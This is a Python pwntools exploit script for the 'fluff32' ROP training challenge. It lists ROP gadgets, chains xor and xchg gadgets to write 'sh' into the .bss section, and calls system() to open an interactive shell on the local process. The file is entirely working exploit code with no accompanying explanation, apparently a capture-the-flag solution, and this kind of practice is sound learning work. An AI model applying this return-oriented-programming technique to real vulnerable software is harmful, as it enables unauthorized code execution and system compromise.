# -*- coding: utf-8 -*-
from pwn import *
p = process('./fluff32')
p.recvuntil("> ")
# ROPgadget --binary ./fluff32 --depth 20 
# 0x08048692 : pop edi ; mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
# 0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
# 0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
# 0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
# 0x080483e1 : pop ebx ; ret

mov_ecx_edx = 0x08048692
xchg_edx_ecx = 0x08048689
xor_edx_ebx = 0x0804867b
xor_edx_edx = 0x08048671
pop_ebx_ret = 0x080483e1

call_system = 0x08048430
bss_addr = 0x0804A040
sh = "sh\x00\x00"
notuse = "a" * 4

# raw_input()

# mov bss_addr to ecx
payload = "a" * 44 
payload += p32(pop_ebx_ret)
payload += p32(bss_addr)
payload += p32(xor_edx_edx)
payload += notuse
payload += p32(xor_edx_ebx)
payload += notuse
payload += p32(xchg_edx_ecx)
payload += notuse

# mov sh to edx 
payload += p32(pop_ebx_ret)
payload += sh
payload += p32(xor_edx_edx)
payload += notuse
payload += p32(xor_edx_ebx)
payload += notuse

# mov sh to bss_addr (mov [ecx], edx)
payload += p32(mov_ecx_edx)
payload += notuse * 2
payload += p32(0)

# call system
payload += p32(call_system)
payload += notuse 
payload += p32(bss_addr)

p.sendline(payload)
p.interactive()


